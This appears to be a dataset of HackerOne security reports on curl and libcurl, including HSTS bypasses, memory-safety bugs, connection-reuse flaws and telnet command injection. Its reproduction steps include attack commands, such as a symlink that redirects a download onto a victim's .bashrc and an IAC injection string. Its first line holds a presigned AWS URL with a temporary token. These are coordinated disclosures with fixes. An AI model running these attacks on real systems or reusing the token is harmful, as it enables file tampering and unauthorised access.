(F2298300)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iwoiekqj89qs92xc72dpq1lf7gqb?response-content-disposition=attachment%3B%20filename%3D%22server.key%22%3B%20filename%2A%3DUTF-8%27%27server.key&response-content-type=application%2Fx-x509-key%3Bformat%3Dpem&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT4NH4WIU%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T025751Z&X-Amz-Expires=711&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA0aCXVzLXdlc3QtMiJHMEUCIDDHO%2BEEDtEvll7w8y1Cso0OyKa2vxZL4A9I5KfXbaB3AiEAqzaoSw%2BhKAVQetDejvCRYUdou5yhUso3YX6praak%2BEMqugUIlv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCRUqmdWbT4DUatE9SqOBZTxg01Y40DsQpyHA9rYXKlagK9STFwPjdjuvqd3aRAv%2F7jfOttTAjDZLhVMCFbnlGJBx5eIq7GYV2KQWa0b0FmoFFjfuxbmwJQbCIKwwUAOcLjoAeaZVxKjvpMR9%2B3P7184a8ijYvD6XiIHW9T%2FmvmAIZKmesZW4rt151l9ZAfk1c2nOFAt47Xb%2F7BxYTwiUiS%2FjvKq82KCUBtAWYuFu8%2F6DatoWVtJfH0Q1%2BfRh8dWTUXcPtfDz4xZYDtve%2BpyF3ll5O4paLH9hMnh5g0dHQGg8LGzhNl3ffM8SQLRMnXjbt9f1yq7ADnqLEbdTa3gFxEO49wBhLVb3DJIW0FhqVsfMROo9lanxLNKqPP9M1KWu%2B1a0TW7sfLpWty9q0Z0eMqvqcWjoKb5%2FYmEtKqeUfm5St1qPI1%2Fje1hqVPw3SmttR%2Fv%2BGlJIlhP1P%2B4o142FNYIURpm0wpHwKemUnWvkzBp7HFTCqchiv0LLSwrJ%2BBx6TsquRhAYxX3EbJeIwxP0U1riV8Wn71QVkNrBkxTbbKk1izl8hldh3mP7Uyj8rDbvs20koyjqyvVfb%2FXXGcHSTOBzRRrAg3TStxMW1xnYA%2FLOMuJUyguEohilQgQ71%2FXvic0TyagD%2BjnTCWluYij3abieLvc4XRLPtgSibvN0FQcaNdNB%2BDxkTEVwoR9XpQzYmsDeOz4%2Bl%2FNvvFykeEFvei0jvx1KRFM%2BJETDdACh%2BoY4wGeNvIZBjGc9xUbcJ9R6tnUW4xqZlII%2FPuHzhCjRPFWpNFi75rBkw2woMXs4TwAHjcI7qUZvaF8HUdxmHjVkk2LGHefXRGFWsBQSbzIt7dS4BbT0XEt%2F8vztXcZA%2BzB6qSJrMwoNR4XEeFT%2FTCI9tvGBjqxAeQcmtXe%2BcpxZR%2Fb2p4UB9qKX%2F82LPBAhpOt58CYo3SYeelWkh6liYogXn4xZhh8s9zo%2FEo4tdKBYcv1IKpRLQs7X7wZ012FaKuq%2B2e0LO3nbmXybmx%2BaNADgykHrptk38kagagYwX6mhiQ1jH3Vorm0ruX2OmJR%2Fz8DlW9JColdaqyMIYIy9nYtHgNstATNo6VoNgtSkhIVCY%2FN1JxPSLLQD%2Bk1cCGM3rRlqd1lWnPdOQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3d033e1bf7aa9235920fdc51165cb70559f325a0dffb61550af58aea4732804c)\n2. `openssl s_server -accept 443 -cert server.crt -key server.key -www`\n3. Modify hosts so that the name resolution result of `xn--l8j.example.local‘ is the IP of your machine in order to perform the test in the local environment.\n4. `curl https://%E3%81%82.example.local --cacert server.crt`\n\nWhen the above is executed, the communication succeeds even though it should result in a validation error.\n\nImpact\n------\n\nImproper Validation of Certificate with Host Mismatch."
},
{
    "url": "https://hackerone.com/reports/1954658",
    "original_report": "Summary:\n--------\n\n[CVE-2022-32221](/hacktivity/cve_discovery?id=CVE-2022-32221) fixes is insufficient.\nIn [CVE-2022-32221](/hacktivity/cve_discovery?id=CVE-2022-32221), only CURLOPT\\_POST was corrected.\nHowever, CURLOPT\\_POST is not necessarily used when sending data with the POST method.\nCURLOPT\\_POST is not used in the CURLOPT\\_POSTFIELDS usage example on the official website.\n\nAlso on this page is the following statement.\n\n> Using CURLOPT\\_POSTFIELDS implies setting CURLOPT\\_POST to 1.\n\n<https://curl.se/libcurl/c/CURLOPT_POSTFIELDS.html>\n\nI think it means that some users do not use CURLOPT\\_POST.\nJust to be clear, CURLOPT\\_POSTFIELDS does not set a `FLASE` on `data->set.upload`.\n\nCURLOPT\\_POST is not used in the CURLOPT\\_MIMEPOST usage example either.\n<https://curl.se/libcurl/c/CURLOPT_MIMEPOST.html>\n\nBased on the above, I think we need to modify the following to assign `FALSE` to `data->set.upload` if we use the following.\n\n* CURLOPT\\_POSTFIELDS\n* CURLOPT\\_COPYPOSTFIELDS\n* CURLOPT\\_MIMEPOST\n\nWe could not determine the deprecated CURLOPT\\_HTTPPOST.\n\nSteps To Reproduce:\n-------------------\n\nAlmost the same source as [#1704017](/reports/1704017). The difference is that line 52 is commented out.\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nImpact\n------\n\nAn attacker could potentially inject data, either from stdin or from an unintended buffer. Further, without even an active attacker, this could lead to segfaults or sensitive information being exposed to an unintended recipient."
},
{
    "url": "https://hackerone.com/reports/1929597",
    "original_report": "Summary:\n--------\n\nIf the system has no POSIX or Windows threading support, `USE_ALARM_TIMEOUT` codepath will be used in `lib/hostip.c`. If two threads will perform DNS resolving, a wrong register context can be used on the signal handler`siglongjmp` call if DNS timeout occurs. Typically this results in segmentation fault, but depending on platform specifics other impacts might be possible (but unlikely).\n\nThe documentation warns against this very issue in <https://curl.se/libcurl/c/threadsafe.html> `It is important that libcurl can find and use thread safe versions of these and other system calls, as otherwise it cannot function fully thread safe.` The issue is that there is no way for the application using libcurl to know if the library is MT safe for DNS resolution or not. `CURL_VERSION_THREADSAFE` is mentioned, but this checks availability of atomic init, not MT safety of DNS resolution.\n\nA remote attacker in a privileged network position is able to selectively block the DNS responses and may thus induce the affected target application to crash.\n\nSteps To Reproduce:\n-------------------\n\n1. For quick testing on POSIX systems add `#define USE_ALARM_TIMEOUT` to `lib/hostip.c`, for example:\n2. Compile libcurl\n3. Compile version of <https://curl.se/libcurl/c/multithread.html> but add `curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2);` to `pull_one_url` function.\n4. Change DNS config to point to blackhole DNS server at `3.219.212.117` (blackhole.webpagetest.org)\n5. Execute the compiled `multithread` and the application will segfault.\n\nRisk discussion\n---------------\n\nI don't consider this issue a major risk since it likely will affect only small percentage of target platforms. Some rare windows configurations might be affected, as discussed in `lib/curl_setup.h`.\n\nRemediation\n-----------\n\nAdd an atomic locking to `USE_ALARM_TIMEOUT` code path to prevent multiple threads from using `sigjmp_buf` at the same time. The downside of this is that it makes DNS resolving serial, but at least it won't crash. Here's a crude proposal for this workaround:\n\nThis fix isn't very optimal however as `curl_simple_lock_lock` is intended for short held locks. It maybe should also refuse to build if `GLOBAL_INIT_IS_THREADSAFE` is not available.\n\nAnother (easier) option would be to make the `Curl_resolv_timeout` `USE_ALARM_TIMEOUT` codepath fail if some other call of the function is in flight. This is quite crude, however.\n\nImpact\n------\n\nDenial of service."
},
{
    "url": "https://hackerone.com/reports/1898475",
    "original_report": "Summary:\n--------\n\nThere's a check if SSH keys match between new and existing connection when considering reuse. This check is broken due to wrong comparison:\n`#define PROTO_FAMILY_SSH (CURLPROTO_SCP|CURLPROTO_SFTP)`\n...\n`else if(get_protocol_family(needle->handler) == PROTO_FAMILY_SSH) {`\nThis never matches as handler family is either `CURLPROTO_SCP` or `CURLPROTO_SFTP`.\n\nRemediation\n-----------\n\n* Make the code:\n  `else if(get_protocol_family(needle->handler) & PROTO_FAMILY_SSH) {`\n\nSteps To Reproduce:\n-------------------\n\n1. Make two connections to the same host with different ssh keys\n\nImpact\n------\n\nConnection reuse when different ssh keys are used."
},
{
    "url": "https://hackerone.com/reports/1895135",
    "original_report": "Summary:\n--------\n\nWhen considering reuse of existing connections different `CURLOPT_GSSAPI_DELEGATION` (libcurl) `--delegation` (curl) option is not taken into consideration. This can lead to reuse of previously established connection when it should no longer be (as more strict or no delegation was requested).\n\nSteps To Reproduce:\n-------------------\n\n1. `curl --negotiate -u : --delegation \"always\" https://server/path -: --negotiate -u : --delegation \"none\" https://server/path`\n\nRemediation\n-----------\n\n* Safest option is to not reuse connections if different `CURLOPT_GSSAPI_DELEGATION` levels are being used. It **might** also be correct to not reuse connections with \"laxer\" `CURLOPT_GSSAPI_DELEGATION`: \"none\" should only allow reusing \"none\" level, \"policy\" should only allow \"none\" or \"policy\" level, while \"always\" can reuse all connections otherwise deemed appropriate for reuse.\n\nImpact\n------\n\nExisting connection that was established via more lax delegation will be reused for connection that should not succeed due to more restrictive delegation requested. The practical impact can vary, but I believe it is likely quite low, as it should be quite rare to have connections attempted with mixed delegation policies like this."
},
{
    "url": "https://hackerone.com/reports/1892780",
    "original_report": "Summary:\n--------\n\nlibcurl FTP(S) protocol will reuse connection even if different `CURLOPT_FTP_ACCOUNT` (libcurl) or `--ftp-account` (curl) is specified for different connections and the server requests account authentication via reply code `332`. It appears that `STRING_FTP_ALTERNATIVE_TO_USER`  (libcurl) or `--ftp-alternative-to-user` (curl) is also affected and should also result in caching being refused.\n\nSteps To Reproduce:\n-------------------\n\n1. terminal 1: `echo -e \"foo\\n\" | nc -v -l -p 9998; echo -e \"bar\\n\" | nc -v -l -p 9998`\n2. terminal 2: `echo -ne \"220 a\\n331 b\\n332 c\\n230 d\\n257 \\\"/\\\"\\n229 (|||9998|)\\n200 e\\n213 4\\n150 f\\n226 g\\n229 (|||9998|)\\n213 4\\n150 f\\n226 g\\n\" | nc -v -l -p 9999`\n3. terminal 3: `curl -v --ftp-account alice \"ftp://ftp@server:9999/file1\" -: --ftp-account bob \"ftp://ftp@server:9999/file2\"`\n\nAs a result connection authenticated as user `alice` will be used when fetching `file2` regardless that user `bob` was specified for fetching it.\n\nRemediation\n-----------\n\n* Don't reuse connection if `CURLOPT_FTP_ACCOUNT` or `STRING_FTP_ALTERNATIVE_TO_USER` are different.\n\nSupporting Material/References:\n-------------------------------\n\n* <https://www.ietf.org/rfc/rfc0959.txt>\n\nImpact\n------\n\nAccessing content with wrong cached credentials."
},
{
    "url": "https://hackerone.com/reports/1892351",
    "original_report": "Summary:\n--------\n\nlibcurl `Curl_getworkingpath` function resolves `~` as remote users' home directory. This routine behaves in an undocumented way for `sftp` protocol. In particular it is said that `/~/` is converted to remote user's home directory (\\*1), while this isn't how the function actually behaves. This can lead to unexpected final path for the `sftp` access, and allow an attacker with partial path access to gain access to untended remote system path locations.\n\nSteps To Reproduce:\n-------------------\n\n1. access `sftp://host/~a../other/file`\n2. remote path will result as: `/home/user/../other/file`\n\nIt's notable that when `~a..` path component is checked for path traversal via normal unix path resolving rules, the path component is **not** considered accessing a parent directory, and thus will bypass path sanitization operations attempting to disallow access to parent directory. As an additional remark, in regular UNIXy world `~user/` specifies another users' home directory, which clearly is not supported by `sftp`. This adds to potential confusion.\n\nRemediation\n-----------\n\n* In `Curl_getworkingpath` convert `~` in `sftp` paths only when either `/~/` or `/~` (if it is the full path) is used. Reject `~<something>` paths (or don't convert them).\n\nSupporting Material/References:\n-------------------------------\n\n1) <https://everything.curl.dev/usingcurl/scpsftp>\n\nImpact\n------\n\nBypassing application implemented path filtering."
},
{
    "url": "https://hackerone.com/reports/1891474",
    "original_report": "Summary:\n--------\n\n`CURLOPT_TELNETOPTIONS` allows setting various telnet options for telnet protocol. Due to missing encoding of \"Interpret as Command\" `IAC` (0xff) character, the attacker who can control these option values can escape out of the telnet subnegotiation and enter arbitrary TELNET commands (\\*) via the `CURLOPT_TELNETOPTIONS` options. `TTYPE`, `XDISPLOC` and `NEW_ENV` options are affected.\n\n\\*) TELNET command refers to \"TELNET COMMAND STRUCTURE\" in RFC 854\n\nSteps To Reproduce:\n-------------------\n\n1. `curl --telnet-option NEW_ENV=a,b$(echo -ne \"\\xff\\xf0INJECTED\") telnet://server`\n\nWhen inspected with tcpdump:\n\nRemediation\n-----------\n\n* Double encode \"Interpret as Command\" (`IAC`) (0xff) if it is encountered when constructing the suboption data to be sent.\n\nSupporting Material/References:\n-------------------------------\n\n* RFC 854 - <https://www.rfc-editor.org/rfc/rfc854>\n\nImpact\n------\n\nAttacker being able to specify `TTYPE`, `XDISPLOC` or `NEW_ENV` values is able to inject unintended TELNET commands to the telnet connection. Depending on the use case of the telnet protocol, this may allow the attacker to inject commands or other controlling operations. The practical impact is context specific, but in worst case this could for example allow executing arbitrary OS commands on target system."
},
{
    "url": "https://hackerone.com/reports/1897203",
    "original_report": "Summary:\n--------\n\nWhen processing HSTS with multi-threading, double-free or UAF may occur due to lack of exclusion control.\nHSTS entries disappear when they expire or when \"max-age=0\" is received.\nIn this case, the offending entry is removed from the internal memory list, freeing memory but not exclusivity control.\nTherefore, depending on the timing, other threads may perform the operation, resulting in double-free or UAF.\n\n`lib/hsts.c` in the function `Curl_hsts_parse` on lines 213-221\n\nIf multiple threads process `hsts_free(sts);` at the same time, it becomes double-free.\nAnother problem is that UAF occurs when other threads access entries.\n\nLines 270-275 have a similar problem.\n\nSteps To Reproduce:\n-------------------\n\n1. [Prepare the following php.]\n\n2. [Compile and run the following cpp.]\n\nThe source was referred to under docs/examples.\n\nSupplement.\nURL is <https://test.local/poc.php>.\nphp that randomly memorizes and deletes HSTS entries.\nIt's hard to reproduce if it's random, but I've confirmed that the problem will occur.\nI attach an image of when the UAF happened(I tried in debug build).\nThe number of threads and the number of loops are increased in order to raise the possibility that the phenomenon will occur.\n\nImpact\n------\n\nDouble-free"
},
{
    "url": "https://hackerone.com/reports/1826048",
    "original_report": "Summary:\n--------\n\nA server can send an HTTP response with many occurrences of Transfer-Encoding and/or Content-Encoding headers. Each listed encoding allocates a buffer. The number of encodings listed within each header is already bounded but the number of headers is not, allowing an HTTP response to consume all available memory.\n\nSteps To Reproduce:\n-------------------\n\nUsing the curl test environment:\n\n1. Extract test418 from the attached patch\n2. runtests.pl 418\n\nSupporting Material/References:\n-------------------------------\n\nPatch fixing the problem and new test for the case.\n\nImpact\n------\n\nDenial of service."
},
{
    "url": "https://hackerone.com/reports/1813864",
    "original_report": "Summary:\n--------\n\ncurl tool HSTS doesn't work correctly when performing multiple requests within a single invocation.\n\nSteps To Reproduce:\n-------------------\n\n1. `curl --hsts \"\" https://hsts.example.com http://hsts.example.com`\n\nThe second request will be performed over HTTP regardless if correct HSTS header is returned by the first request.\n\nImpact\n------\n\nRequest performed over insecure channels unexpectedly and loss of confidentiality and integrity."
},
{
    "url": "https://hackerone.com/reports/1814333",
    "original_report": "Summary:\n--------\n\ncurl overwrites HSTS cache entries if requests are performed in parallel.\n\nSteps To Reproduce:\n-------------------\n\n1. `curl --parallel --hsts hsts.txt https://site1.tld https://site2.tld https://site3.tld`\n\nOnly one of the sites contacted will have entry in `hsts.txt` afterwards. Non-TLS connection to the other sites will not protected by TLS.\n\nImpact\n------\n\nRequest performed over insecure channels unexpectedly and loss of confidentiality and integrity."
},
{
    "url": "https://hackerone.com/reports/1814824",
    "original_report": "Summary:\n--------\n\nIf curl command is used to download a file with predictable file name to a world writable directory (such as `/tmp`), a local attacker is able to mount a symlink attack to either A) redirect the target file writing to another file writable by the user or B) replace the downloaded file contents with arbitrary other data. libcurl `file://` upload is similarly affected.\n\nHowever, this really isn't a vulnerability in curl or libcurl itself, but use of curl or libcurl.\n\nSteps To Reproduce:\n-------------------\n\n### Scenario A example:\n\n* attacker does:\n  `ln -s /home/victim/.bashrc /tmp/target.sh`\n* victim does:\n  `curl --output-dir /tmp -O https://example.com/target.sh` or\n  `curl -o /tmp/target.sh https://example.com/whatever` or similar\n\n=> Instead of downloading the file to `/tmp/target.sh` it will be written to `/home/victim/.bashrc`. This attack works the best when the attacker can control which file is downloaded (granted, this is often not possible).\n\n### Scenario B example:\n\n* attacker does:\n  `install -m 606 /dev/null /tmp/target.sh`\n* attacker waits for the file to be closed (inotify), and immediately replaces the file contents with malicious content once closed\n* victim does:\n  `curl --output-dir /tmp -O https://example.com/target.sh` or\n  `curl -o /tmp/target.sh https://example.com/whatever` or similar\n\n=> The victim downloaded content is replaced by malicious content before it's used (copied, executed etc) by the victim.\n\nRemediation\n-----------\n\n* Documentation should be amended to warn users against this threat. If temporary files are used, they should be put to secure temporary directory (created by `mktemp -d` or similar).\n* While not a vulnerability in curl/libcurl a mode that uses `O_NOFOLLOW` when opening output files could be added. Similarly in this secure mode `--create-dirs` would need to be amended to refuse to create entry in any location owned by another user (but making this check bulletproof is tricky), This mode could not be the default behaviour, since it would likely break too many things.\n\nVulnerability discussion\n------------------------\n\nThe obvious argument against this being a vulnerability in curl/libcurl is that the user is responsible for the permissions of the directory they download to. That is: the insecure use of curl/libcurl is actually where the vulnerability lies.\n\nInterwebs has quite many examples of vulnerable use or examples, including: <https://daniel.haxx.se/blog/2020/09/10/store-the-curl-output-over-there/>\n\nImpact\n------\n\nA) Overwriting files owned by the user downloading the files.\nB) Replacing downloaded data with malicious content"
},
{
    "url": "https://hackerone.com/reports/1825377",
    "original_report": "Summary:\n--------\n\nIf libcurl is built against libssh `CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256` is quietly ignored. As a result a SSH connection will be established even if the SHA256 key set doesn't match.\n\nSteps To Reproduce:\n-------------------\n\n1. configure libcurl with libssh and build it\n2. `curl --hostpubsha256 HOSTFINGERPRINTHERE sftp://example.tld/`\n\nInstead of failing due to mismatching fingerprint the connection quietly continues.\n\nWhile the `CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256`  documentation does mention that this option `Requires the libssh2 backend`, it is still wrong to quietly ignore the validation.\n\nRemediation\n-----------\n\nChange `lib/vssh/libssh.c` `myssh_is_known` to reject connection if `CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256` is set, or implement sha256 fingerprint support for libssh.\n\nImpact\n------\n\nSSH host validation bypass."
},
{
    "url": "https://hackerone.com/reports/1764858",
    "original_report": "Issue(s) reported by Trail of Bits. This is either one or two issues.\n\nSummary:\n--------\n\n`./src/curl 0 -x0:80 telnet:/[j-u][j-u]//0 -m 01`\n`./src/curl 0 -x0:80 smb:/[j-u][j-u]//0 -m 01`\n\nBoth command line ends up having libcurl access and use already freed heap-memory. For read and write.\n\nSteps To Reproduce:\n-------------------\n\nSee above, run with valgrind for full report.\n\nI have a local HTTP server on localhost host port 80 that will send back a 502 on the CONNECT requests curl issues to it for these protocols.\n\nSupporting Material/References:\n-------------------------------\n\nSee logs.\n\nImpact\n------\n\nUse after free stuff."
},
{
    "url": "https://hackerone.com/reports/1755083",
    "original_report": "Summary:\n--------\n\nI found an issue similar to [CVE-2022-42916](/hacktivity/cve_discovery?id=CVE-2022-42916) again.\nSince the phenomenon is the same, I will describe the same as last time.\n\nHSTS checks are bypassed if any character in the IDN convert(Nameprep) to a '.'\nfor example\"。\"(UTF-8:E38082).\nI think there are other characters that become \".(UTF-8:2E)\" as a result of converting with IDN.\n\nThis is because the host name before IDN conversion is used when writing to the HSTS cache.\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1. Start from a state where there is no entry for the access destination host name in the HSTS cache\n2. `curl -v --hsts hsts.txt https://accounts.google%E3%80%82com`\n3. `curl -v --hsts hsts.txt http://accounts.google%E3%80%82com`\n\nResult of 3.\n\nIf you execute 3. after executing the below, you will access the site with HTTPS.\n`curl -v --hsts hsts.txt https://accounts.google.com`\n\nI use [this](https://curl.se/download/curl-7.86.0.zip) in a Windows environment.\n\nI checked the HSTS cache after executing 2. and found the host name before IDN conversion.\n\nI think the problem is in http.c:line 3727.\ndata->state.up.hostname is the hostname of the IDN unconverted.\n\nImpact\n------\n\nHSTS bypass."
},
{
    "url": "https://hackerone.com/reports/1722065",
    "original_report": "This is a finding that Trail of Bits found in their ongoing curl security audit. Reported at a status meeting today.\n\nSummary:\n--------\n\ncurl frees memory twice in some cleanup function related to HTTP proxies.\n\nIt as simple as `curl -x http://localhost:80 dict://127.0.0.1`\n\nUsing valgrind on the current git master, it shows:\n\n55921 Memcheck, a memory error detector\n55921 Copyright (C) 2002-2022, and GNU GPL'd, by Julian Seward et al.\n55921 Using Valgrind-3.19.0 and LibVEX; rerun with -h for copyright info\n55921 Command: ./src/curl -x http://localhost:80 dict://127.0.0.1\n55921 Parent PID: 3035\n55921\n55921 Invalid free() / delete / delete[] / realloc()\n55921 at 0x484617B: free (vg\\_replace\\_malloc.c:872)\n55921 by 0x152464: curl\\_dbg\\_free (memdebug.c:297)\n55921 by 0x17E11C: Curl\\_free\\_request\\_state (url.c:2259)\n55921 by 0x179B38: Curl\\_close (url.c:421)\n55921 by 0x1482DD: curl\\_easy\\_cleanup (easy.c:799)\n55921 by 0x1359F4: post\\_per\\_transfer (tool\\_operate.c:657)\n55921 by 0x13D085: serial\\_transfers (tool\\_operate.c:2431)\n55921 by 0x13D5FC: run\\_all\\_transfers (tool\\_operate.c:2617)\n55921 by 0x13D972: operate (tool\\_operate.c:2729)\n55921 by 0x13427C: main (tool\\_main.c:276)\n55921 Address 0x5b1c790 is 0 bytes inside a block of size 984 free'd\n55921 at 0x484617B: free (vg\\_replace\\_malloc.c:872)\n55921 by 0x152464: curl\\_dbg\\_free (memdebug.c:297)\n55921 by 0x17AE5E: conn\\_free (url.c:810)\n55921 by 0x17B132: Curl\\_disconnect (url.c:893)\n55921 by 0x15D523: multi\\_runsingle (multi.c:2614)\n55921 by 0x15D7B6: curl\\_multi\\_perform (multi.c:2683)\n55921 by 0x147FFB: easy\\_transfer (easy.c:663)\n55921 by 0x14822C: easy\\_perform (easy.c:753)\n55921 by 0x148276: curl\\_easy\\_perform (easy.c:772)\n55921 by 0x13D064: serial\\_transfers (tool\\_operate.c:2429)\n55921 by 0x13D5FC: run\\_all\\_transfers (tool\\_operate.c:2617)\n55921 by 0x13D972: operate (tool\\_operate.c:2729)\n55921 Block was alloc'd at\n55921 at 0x48485EF: calloc (vg\\_replace\\_malloc.c:1328)\n55921 by 0x1521A6: curl\\_dbg\\_calloc (memdebug.c:175)\n55921 by 0x1BEC8F: connect\\_init (http\\_proxy.c:174)\n55921 by 0x1C02C2: Curl\\_proxyCONNECT (http\\_proxy.c:1061)\n55921 by 0x1BEA43: Curl\\_proxy\\_connect (http\\_proxy.c:118)\n55921 by 0x1B67D4: Curl\\_http\\_connect (http.c:1551)\n55921 by 0x15C03A: multi\\_runsingle (multi.c:2027)\n55921 by 0x15D7B6: curl\\_multi\\_perform (multi.c:2683)\n55921 by 0x147FFB: easy\\_transfer (easy.c:663)\n55921 by 0x14822C: easy\\_perform (easy.c:753)\n55921 by 0x148276: curl\\_easy\\_perform (easy.c:772)\n55921 by 0x13D064: serial\\_transfers (tool\\_operate.c:2429)\n55921\n55921\n55921 HEAP SUMMARY:\n55921 in use at exit: 0 bytes in 0 blocks\n55921 total heap usage: 4,712 allocs, 4,713 frees, 893,816 bytes allocated\n55921\n55921 All heap blocks were freed -- no leaks are possible\n55921\n55921 For lists of detected and suppressed errors, rerun with: -s\n55921 ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 0 from 0)\n\nImpact\n------\n\nDouble-free is nasty"
},
{
    "url": "https://hackerone.com/reports/1704017",
    "original_report": "Summary:\n--------\n\nThe bug I submitted at <https://github.com/curl/curl/issues/9507> can have at least a few unintended security issues:\n\n* Information Disclosure: this bug causes an HTTP PUT to occur when the user intends for an HTTP POST to occur. The user, who intended an HTTP POST, expects the POSTed information to come from CURLOPT\\_POSTFIELDS. However, as an HTTP PUT is performed instead, the data that is PUT comes from a buffer specified in CURLOPT\\_READDATA, which may be sensitive information intended for an entirely different host (host1.com below). If CURLOPT\\_READDATA is not specified, this data could come from stdin!\n* Use after free: using the description above, if the user had already freed the data specified in CURLOPT\\_READDATA, then the unintended HTTP PUT (which was intended to be an HTTP POST) would attempt to read the freed data specified in CURLOPT\\_READDATA.\n\nSteps To Reproduce:\n-------------------\n\nThe following code is similar to the code I posted at <https://github.com/curl/curl/issues/9507>, but now highlights the potential security issues (which I did not think wise to disclose on GitHub):\n\nSupporting Material/References:\n-------------------------------\n\nThe bug that leads to these potential security issues is documented at <https://github.com/curl/curl/issues/9507>\n\nImpact\n------\n\nAn attacker could potentially inject data, either from stdin or from an unintended buffer. Further, without even an active attacker, this could lead to segfaults or sensitive information being exposed to an unintended recipient."
},
{
    "url": "https://hackerone.com/reports/1730660",
    "original_report": "Summary:\n--------\n\nHSTS checks are bypassed if any character in the IDN convert(Nameprep) to a '.'\nfor example\"。\"(UTF-8:E38082).\nI think there are other characters that become \".(UTF-8:2E)\" as a result of converting with IDN.\n\n'。(UTF-8:E38082)' is converted to '.' so it doesn't matter if it's last or not.\nSo the same thing happens with \"[http://accounts.google.com。\"](http://accounts.google.com%E3%80%82%22) as well as \"[http://accounts.google。com\"](http://accounts.google%E3%80%82com%22).\n\nSteps To Reproduce:\n-------------------\n\n`curl -v --hsts hsts.txt http://accounts.google.com。`\nI prepared \"test.sh\" because I was worried about whether I could try it in an environment without Japanese fonts. The character encoding is UTF-8.\n\nhsts:txt:\n\nThe results of the execution are shown below.\n\nIDN When not converting:\n\nWhen IDN convert(1):\n\nWhen running with -L, TLS communication was successful. In other words, certificate validation (CN/SAN validation) works fine, so I think you should do the same for HSTS.\n\nI determined the severity with reference to [#1557449](/reports/1557449)\n\nImpact\n------\n\nHSTS bypass."
},
{
    "url": "https://hackerone.com/reports/1721098",
    "original_report": "Summary:\n--------\n\nCurl expects the .netrc file to have space characters. So if there is no space character, it will do an out-of-bounds read and a 1-byte out-of-bounds write.\nThis can happen multiple times depending on the state of the memory.\n\nSteps To Reproduce:\n-------------------\n\n`curl --netrc-file .netrc test.local`\n\".netrc\" is attached.\nThe content is 'a' for 4095 bytes.\nDepending on memory conditions, even single-byte files can cause problems.\n\nIt's not exactly just spaces and newlines.\nThe condition is that the .netrc file does not contain characters for which ISSPACE() returns true (so it is also a condition that there is no line feed code).\nThere is a problem with parsenetrc() in lib/netrc.c.\nparsenetrc() has the following loop.\n\nThe 'a' and the terminating character '\\0' in the .netrc file are characters for which ISSPACE() returns false, so while on line 25 is true(!false).\nThis causes an out-of-bounds read.\nAlso, line 27 is an out-of-bounds write. (1 byte for '\\0).\n\nRemediation ideas:\n------------------\n\nI think it would be better to include the condition that \\*tok is not NULL in the while statement.\n\nImpact\n------\n\nApplication crash plus other as yet undetermined consequences."
},
{
    "url": "https://hackerone.com/reports/1613943",
    "original_report": "Summary:\n--------\n\nI took a look at <https://github.com/curl/curl/pull/9048/commits/d7bcbc7d8d4b6d972d3da12d54819169a19c287b> (a sneak peek on a vulnerability to be announced tomorrow). My guess for that vulnerability is that since cookies are persistent, someone who can trick curl into storing cookies can store large amounts of cookies into curl cookie store, which will prevent curl from ever interacting with the server (due to large request being generated causing a 400 error)\n\nI found a separate way to do this, curl does not implement character check on cookie name or value when saving to cookie store. So for example a form feed '\\f' can be saved in curl's cookie store. When form feed is sent by curl to a server such as Apache, Apache will respond with 400 Error (historically, Apache would accept, however now due to HTTP smuggling concerns, Apache will now strictly reject any such control characters.), preventing someone from ever interacting the server with the cookie store.\n\nAccording to the spec, cookies should not contain control characters anyway, see <https://datatracker.ietf.org/doc/html/rfc6265#section-4.1.1>.\n\nSteps To Reproduce:\n-------------------\n\n\n\nIn test.php,\n\nSetup malicious server,\n\n2. Cookie with form feed is saved, see 0c byte before the 0a terminator\n\n3. Apache will now respond with \"400 bad request\" on further request to the server using the poisoned cookie store. This because Apache rejects control characters other than \\r or \\n in the request head.\n\nImpact\n------\n\nAn attacker can possibly MiTM the connection and poison the cookie store using cookies with control characters, preventing a user / application from ever interacting with the particular HTTP server with the same cookie store.\n\nPossibly same impact as the \"cookie limit\" vulnerability to be announced tomorrow."
},
{
    "url": "https://hackerone.com/reports/1569946",
    "original_report": "Summary:\n--------\n\nCurl fails to limit the number of cookies that can be set by a single host/domain. It can easily lead to a situation where constructing the request towards a host will end up consuming more than `DYN_HTTP_REQUEST` memory, leading to instant `CURLE_OUT_OF_MEMORY`.\n\nAny host in a given domain can target any other hosts in the same domain by using domain cookies. The attack works from both `HTTP` and `HTTPS` and from unprivileged ports.\n\nSteps To Reproduce:\n-------------------\n\n1. Run the following python web server:\n\n2. `curl -c cookie.txt -b cookie.txt --connect-to evilsite.hax.invalid:80:127.0.0.1:9000 http://evilsite.hax.invalid/`\n3. `curl -c cookie.txt -b cookie.txt --connect-to targetedsite.hax.invalid:80:127.0.0.1:9000 http://targetedsite.hax.invalid/`\n\nThis is [CWE-770](/hacktivity/cwe_discovery?id=cwe-770): Allocation of Resources Without Limits or Throttling\n\nRemediation ideas\n=================\n\nThe cookie matching being as complicated as it is makes it a bit hard to create a fix that always works fine. The request inhabits other headers as well as the cookies, so the amount of storage available for the cookies also varies per request.\n\nOne relatively \"easy\" way to mitigate this would be to limit the amount of domain cookies a domain can have. But what should be done if `Set-Cookie` would go over this limit? Maybe flush the oldest cookies?\n\nImpact\n------\n\nDenial of service"
},
{
    "url": "https://hackerone.com/reports/1570651",
